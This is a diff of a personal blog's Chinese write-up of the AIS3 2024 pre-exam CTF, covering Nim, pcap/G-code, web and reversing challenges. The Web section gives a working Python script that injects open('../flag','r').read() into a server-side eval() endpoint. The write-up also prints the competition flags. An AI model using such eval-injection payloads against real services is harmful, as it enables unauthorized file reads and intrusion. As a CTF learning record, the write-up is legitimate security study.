@@ -12,57 +12,58 @@
 
 <link rel="stylesheet" href="/css/main.css">
 
-
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap/css?family=Noto Sans TC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
 <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"onion.csie.org","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta name="description" content="自從上次參加 AIS3 後，我的 CTF 技術並沒有進步多少，抱著跟高一時一樣的程度參加了這次的 pre-exam">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AIS3 2024 pre-exam write up">
-<meta property="og:url" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/index.html">
+<meta property="og:url" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/index.html">
 <meta property="og:site_name" content="onion 隨筆">
 <meta property="og:description" content="自從上次參加 AIS3 後，我的 CTF 技術並沒有進步多少，抱著跟高一時一樣的程度參加了這次的 pre-exam">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/welcome.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/nim-heist-code.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/nim-heist-game.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/3D-wireshark.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/3D-packet.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/3D-flag.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/evil-code.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/long0.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/long1.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/rage0.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/rage1.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/rage2.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/rage3.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/rage4.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/rage5.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/rage6.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/rage7.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/babyRSA-code.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/mathter0.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/mathter1.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/mathter2.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/mathter3.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/mathter4.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/mathter5.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/mathter6.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/mathter7.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/mathter-readelf.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/mathter8.png">
-<meta property="og:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/mathter9.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/welcome.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/nim-heist-code.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/nim-heist-game.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/3D-wireshark.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/3D-packet.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/3D-flag.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/evil-code.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/long0.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/long1.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/rage0.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/rage1.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/rage2.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/rage3.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/rage4.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/rage5.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/rage6.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/rage7.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/babyRSA-code.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/mathter0.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/mathter1.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/mathter2.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/mathter3.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/mathter4.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/mathter5.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/mathter6.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/mathter7.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/mathter-readelf.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/mathter8.png">
+<meta property="og:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/mathter9.png">
 <meta property="article:published_time" content="2024-07-16T15:12:54.000Z">
-<meta property="article:modified_time" content="2024-07-16T17:19:34.971Z">
+<meta property="article:modified_time" content="2025-07-30T03:47:11.720Z">
 <meta property="article:author" content="onion chen">
+<meta property="article:tag" content="AIS3">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/welcome.png">
+<meta name="twitter:image" content="https://onion.csie.org/ais3-2024-pre-exam-write-up/welcome.png">
 
-<link rel="canonical" href="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/">
+<link rel="canonical" href="https://onion.csie.org/ais3-2024-pre-exam-write-up/">
 
 
 <script id="page-configurations">
@@ -153,9 +154,9 @@
     <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
 
   </li>
-        <li class="menu-item menu-item-tags">
+        <li class="menu-item menu-item-categories">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
 
   </li>
         <li class="menu-item menu-item-archives">
@@ -191,12 +192,12 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/16/AIS3-2024-pre-exam-write-up/">
+    <link itemprop="mainEntityOfPage" href="https://onion.csie.org/ais3-2024-pre-exam-write-up/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/uploads/avatar.jpg">
       <meta itemprop="name" content="onion chen">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="onion chen 的 Blog，紀錄一些有趣事物。">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -221,8 +222,17 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-07-17 01:19:34" itemprop="dateModified" datetime="2024-07-17T01:19:34+08:00">2024-07-17</time>
+                <time title="Modified: 2025-07-30 11:47:11" itemprop="dateModified" datetime="2025-07-30T11:47:11+08:00">2025-07-30</time>
               </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Write-Up/" itemprop="url" rel="index"><span itemprop="name">Write Up</span></a>
+                </span>
+            </span>
 
           
 
@@ -239,27 +249,27 @@
 <span id="more"></span>
 
 <p>因為不怎麼厲害，解出來的題目不多。<br>話說這場 pre-exam 是我剛從美國比完 ISEF 飛回來的隔兩天就比，是有點刺激了。</p>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/welcome.png"></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p><img src="/ais3-2024-pre-exam-write-up/welcome.png"></p>
 <p>題目裡就有:D<br>Flag:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Welc0me_to_AIS3_PreExam_2o24!&#125;</span><br></pre></td></tr></table></figure>
 
 
-<h3 id="Quantum-Nim-Heist"><a href="#Quantum-Nim-Heist" class="headerlink" title="Quantum Nim Heist"></a>Quantum Nim Heist</h3><p>提示說要多玩，不用按照既定的遊戲規則走。<br>於是看 source code 發現有個地方沒有檢查輸入的限制：<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/nim-heist-code.png" alt="圖片"></p>
-<p>也就是說如果 choice 是除了 0, 1, 2 以外的數字，會直接進到讓電腦玩家下棋，玩家不用下棋，這樣就可以跳過一步了。<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/nim-heist-game.png" alt="圖片"><br>如此一來就可以讓 <code>nim_sum</code> 在電腦下的時候是 0，如此就可以換成我們下棋使得 <code>num_sum</code> 為 0，進而贏得遊戲，而用 source code 中的程式就可以算出要下哪裡。</p>
+<h3 id="Quantum-Nim-Heist"><a href="#Quantum-Nim-Heist" class="headerlink" title="Quantum Nim Heist"></a>Quantum Nim Heist</h3><p>提示說要多玩，不用按照既定的遊戲規則走。<br>於是看 source code 發現有個地方沒有檢查輸入的限制：<br><img src="/ais3-2024-pre-exam-write-up/nim-heist-code.png" alt="圖片"></p>
+<p>也就是說如果 choice 是除了 0, 1, 2 以外的數字，會直接進到讓電腦玩家下棋，玩家不用下棋，這樣就可以跳過一步了。<br><img src="/ais3-2024-pre-exam-write-up/nim-heist-game.png" alt="圖片"><br>如此一來就可以讓 <code>nim_sum</code> 在電腦下的時候是 0，如此就可以換成我們下棋使得 <code>num_sum</code> 為 0，進而贏得遊戲，而用 source code 中的程式就可以算出要下哪裡。</p>
 <p>Flag:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?&#125;</span><br></pre></td></tr></table></figure>
 <p>(一開始本來以為是要破解 hash 有沒有漏洞，但原來不用)</p>
 <h3 id="Three-Dimensional-Secret"><a href="#Three-Dimensional-Secret" class="headerlink" title="Three Dimensional Secret"></a>Three Dimensional Secret</h3><p>題目給了 Wireshark 的封包，打開後可以看到 <code>192.168.77.128</code> 想跟 <code>192.168.77.1</code> 通訊，後來兩邊開始了 TCP 通訊，並且是 <code>192.168.77.1</code> 傳很多資料給 <code>192.168.77.128</code>。</p>
-<p><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/3D-wireshark.png" alt="圖片"></p>
+<p><img src="/ais3-2024-pre-exam-write-up/3D-wireshark.png" alt="圖片"></p>
 <p>打開第一個很大的封包看到有 MAXX、MAXY、MAXZ 的字，加上題目的 “Three Dimensional Secret”，可能跟 3D 印表機有關</p>
-<p>第一個封包裡面的字：<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/3D-packet.png" alt="圖片"></p>
+<p>第一個封包裡面的字：<br><img src="/ais3-2024-pre-exam-write-up/3D-packet.png" alt="圖片"></p>
 <p>查了一下發現內容是 G-code，好像是用來建模的語言(?。然後 <code>192.168.77.1</code> 傳了很多個包含 G-code 的封包所以，我就手工把每一個封包的 Data 複製到記事本，挑出是 G-code 的部分，然後貼到線上繪製 G-code 的平台。就可以看到這些 G-code 是在用 3D 列印印出 Flag。</p>
-<p><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/3D-flag.png" alt="圖片"><br>G-code 長的就像是左邊的介面，G 是一個指令的開頭</p>
+<p><img src="/ais3-2024-pre-exam-write-up/3D-flag.png" alt="圖片"><br>G-code 長的就像是左邊的介面，G 是一個指令的開頭</p>
 <p>Flag: </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;b4d1y_tun3d_PriN73r&#125;</span><br></pre></td></tr></table></figure>
 
 <p>(複製貼上有夠累，也許有更好的方法…?)</p>
-<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Evil-Calculator"><a href="#Evil-Calculator" class="headerlink" title="Evil Calculator"></a>Evil Calculator</h3><p>看 source code 可以看到，如果用 http post 連上網站的 <code>/calculate</code>，就會用 <code>eval()</code> 執行在參數 <code>expression</code> 內的內容並且返回，這好像是可以利用的地方。<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/evil-code.png" alt="圖片"></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Evil-Calculator"><a href="#Evil-Calculator" class="headerlink" title="Evil Calculator"></a>Evil Calculator</h3><p>看 source code 可以看到，如果用 http post 連上網站的 <code>/calculate</code>，就會用 <code>eval()</code> 執行在參數 <code>expression</code> 內的內容並且返回，這好像是可以利用的地方。<br><img src="/ais3-2024-pre-exam-write-up/evil-code.png" alt="圖片"></p>
 <p>提供的 source code 有寫 flag 的檔案位置，所以要 <code>eval()</code> 的指令是 <code>open(&#39;../flag&#39;,&#39;r&#39;).read()</code>，因此在 payload 內 expression 的內容就是 <code>open(&#39;../flag&#39;,&#39;r&#39;).read()</code></p>
 <p>Script:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">url = <span class="string">&quot;http://chals1.ais3.org:5001/calculate&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;expression&quot;</span>: <span class="string">&quot;open(&#x27;../flag&#x27;,&#x27;r&#x27;).read()&quot;</span>&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">r = requests.post(url=url, data=json.dumps(payload), headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
@@ -267,28 +277,28 @@
 <p>Flag:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;7RiANG13_5NAK3_I5_50_3Vi1&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="The-Long-Print"><a href="#The-Long-Print" class="headerlink" title="The Long Print"></a>The Long Print</h3><p>用 Ghidra 打開檔案後，看到他輸出 flag 一個字元後會 <code>sleep</code> 很長一段時間<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/long0.png" alt="圖片"></p>
-<p>所以就用 Ghidra 把它改成短一點的時間<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/long1.png" alt="圖片"></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="The-Long-Print"><a href="#The-Long-Print" class="headerlink" title="The Long Print"></a>The Long Print</h3><p>用 Ghidra 打開檔案後，看到他輸出 flag 一個字元後會 <code>sleep</code> 很長一段時間<br><img src="/ais3-2024-pre-exam-write-up/long0.png" alt="圖片"></p>
+<p>所以就用 Ghidra 把它改成短一點的時間<br><img src="/ais3-2024-pre-exam-write-up/long1.png" alt="圖片"></p>
 <p>但因為他輸出完一個字元後會再輸出 <code>\r</code>，所以要輸出一個字元後按 enter，就可以留住字元。</p>
 <p>Flag:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;You_are_the_master_of_time_management!!!!?&#125;</span><br></pre></td></tr></table></figure>
 
 <p>(一開始看到 Flag 的開頭以為跟 AIS3 2022 一模一樣就送了那年的 Flag 但慢慢等完發現不太一樣 XD)</p>
-<h3 id="火拳のエース"><a href="#火拳のエース" class="headerlink" title="火拳のエース"></a>火拳のエース</h3><p>用 Ghidra 打開檔案後，可以看到要我們輸入四個 8 個字的字串<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/rage0.png" alt="圖片"></p>
-<p>然後 <code>main()</code> 呼叫了 <code>print_flag()</code>，這個函數就很慢很慢的印出部分的 flag。<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/rage1.png" alt="圖片"></p>
-<p>接著這四個字串分別跟另外四個字串 (<code>DAT</code> 開頭的) 做 xor<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/rage2.png" alt="圖片"></p>
-<p>看進去 <code>xor_strings()</code> 可以看到，基本上就是對一個字元一個字元的 ascii 做 xor，然後把結果傳到第三個參數的位置<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/rage3.png" alt="圖片"></p>
-<p>然後看到四個 <code>DAT</code> 開頭的字串，可以看到他們是一串數字。<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/rage4.png" alt="圖片"></p>
-<p>做完 <code>xor_strings()</code> 後，四個字串再一個字元一個字元分別被送進 <code>complex_function()</code> 裡面<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/rage5.png" alt="圖片"></p>
-<p><code>complex_function()</code>:<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/rage6.png" alt="圖片"></p>
-<p>最後四個字串作完的結果要分別等於 if 條件裡面的字串，所以這題的目標就是構造出輸入的字串，而這四個字串應該就是 flag<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/rage7.png" alt="圖片"></p>
+<h3 id="火拳のエース"><a href="#火拳のエース" class="headerlink" title="火拳のエース"></a>火拳のエース</h3><p>用 Ghidra 打開檔案後，可以看到要我們輸入四個 8 個字的字串<br><img src="/ais3-2024-pre-exam-write-up/rage0.png" alt="圖片"></p>
+<p>然後 <code>main()</code> 呼叫了 <code>print_flag()</code>，這個函數就很慢很慢的印出部分的 flag。<br><img src="/ais3-2024-pre-exam-write-up/rage1.png" alt="圖片"></p>
+<p>接著這四個字串分別跟另外四個字串 (<code>DAT</code> 開頭的) 做 xor<br><img src="/ais3-2024-pre-exam-write-up/rage2.png" alt="圖片"></p>
+<p>看進去 <code>xor_strings()</code> 可以看到，基本上就是對一個字元一個字元的 ascii 做 xor，然後把結果傳到第三個參數的位置<br><img src="/ais3-2024-pre-exam-write-up/rage3.png" alt="圖片"></p>
+<p>然後看到四個 <code>DAT</code> 開頭的字串，可以看到他們是一串數字。<br><img src="/ais3-2024-pre-exam-write-up/rage4.png" alt="圖片"></p>
+<p>做完 <code>xor_strings()</code> 後，四個字串再一個字元一個字元分別被送進 <code>complex_function()</code> 裡面<br><img src="/ais3-2024-pre-exam-write-up/rage5.png" alt="圖片"></p>
+<p><code>complex_function()</code>:<br><img src="/ais3-2024-pre-exam-write-up/rage6.png" alt="圖片"></p>
+<p>最後四個字串作完的結果要分別等於 if 條件裡面的字串，所以這題的目標就是構造出輸入的字串，而這四個字串應該就是 flag<br><img src="/ais3-2024-pre-exam-write-up/rage7.png" alt="圖片"></p>
 <p>所以按照整個程式的流程寫出一個反過來的 script:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">g0 = <span class="string">&quot;DHLIYJEG&quot;</span>  <span class="comment"># 最終要變成的字串</span></span><br><span class="line">g1 = <span class="string">&quot;MZRERYND&quot;</span></span><br><span class="line">g2 = <span class="string">&quot;RUYODBAH&quot;</span></span><br><span class="line">g3 = <span class="string">&quot;BKEMPBRE&quot;</span></span><br><span class="line"></span><br><span class="line">c0 = [<span class="number">0x0e</span>, <span class="number">0x0d</span>, <span class="number">0x7d</span>, <span class="number">0x06</span>, <span class="number">0x0f</span>, <span class="number">0x17</span>, <span class="number">0x76</span>, <span class="number">0x04</span>]  <span class="comment"># DAT 開頭的字串</span></span><br><span class="line">c1 = [<span class="number">0x6d</span>, <span class="number">0x00</span>, <span class="number">0x1b</span>, <span class="number">0x7c</span>, <span class="number">0x6c</span>, <span class="number">0x13</span>, <span class="number">0x62</span>, <span class="number">0x11</span>]</span><br><span class="line">c2 = [<span class="number">0x1e</span>, <span class="number">0x7e</span>, <span class="number">0x06</span>, <span class="number">0x13</span>, <span class="number">0x07</span>, <span class="number">0x66</span>, <span class="number">0x0e</span>, <span class="number">0x71</span>]</span><br><span class="line">c3 = [<span class="number">0x17</span>, <span class="number">0x14</span>, <span class="number">0x1d</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x67</span>, <span class="number">0x74</span>, <span class="number">0x33</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rev_complex_function</span>(<span class="params">goal, param2</span>):</span><br><span class="line">    goal = <span class="built_in">ord</span>(goal)</span><br><span class="line">    now = goal - <span class="number">0x41</span></span><br><span class="line">    iVar1 = param2 % <span class="number">3</span> + <span class="number">3</span></span><br><span class="line">    t = param2 % <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> (x*iVar1 + <span class="number">7</span>) % <span class="number">0x1a</span> == now:</span><br><span class="line">                local_10 = x</span><br><span class="line">    <span class="keyword">elif</span> t == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> (x + iVar1*<span class="number">2</span>) % <span class="number">0x1a</span> == now:</span><br><span class="line">                local_10 = x</span><br><span class="line">    <span class="keyword">elif</span> t == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> (x - iVar1 + <span class="number">0x1a</span>) % <span class="number">0x1a</span> == now:</span><br><span class="line">                local_10 = x</span><br><span class="line">    </span><br><span class="line">    param1 = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> (i + param2*<span class="number">0x11</span>) % <span class="number">0x1a</span> == local_10:</span><br><span class="line">            param1 = i + <span class="number">0x41</span></span><br><span class="line">            <span class="built_in">print</span>(param2, param1, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(param1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b0 = <span class="string">&quot;&quot;</span></span><br><span class="line">b1 = <span class="string">&quot;&quot;</span></span><br><span class="line">b2 = <span class="string">&quot;&quot;</span></span><br><span class="line">b3 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(g0)):</span><br><span class="line">    b0 += rev_complex_function(g0[i], i)</span><br><span class="line">    b1 += rev_complex_function(g1[i], i+<span class="number">0x20</span>)</span><br><span class="line">    b2 += rev_complex_function(g2[i], i+<span class="number">0x40</span>)</span><br><span class="line">    b3 += rev_complex_function(g3[i], i+<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">a0 = <span class="string">&quot;&quot;</span></span><br><span class="line">a1 = <span class="string">&quot;&quot;</span></span><br><span class="line">a2 = <span class="string">&quot;&quot;</span></span><br><span class="line">a3 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b0)):</span><br><span class="line">    a0 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(b0[i]) ^ c0[i])</span><br><span class="line">    a1 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(b1[i]) ^ c1[i])</span><br><span class="line">    a2 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(b2[i]) ^ c2[i])</span><br><span class="line">    a3 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(b3[i]) ^ c3[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a0+a1+a2+a3)</span><br></pre></td></tr></table></figure>
 
 <p>Flag:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!&#125;</span><br></pre></td></tr></table></figure>
 
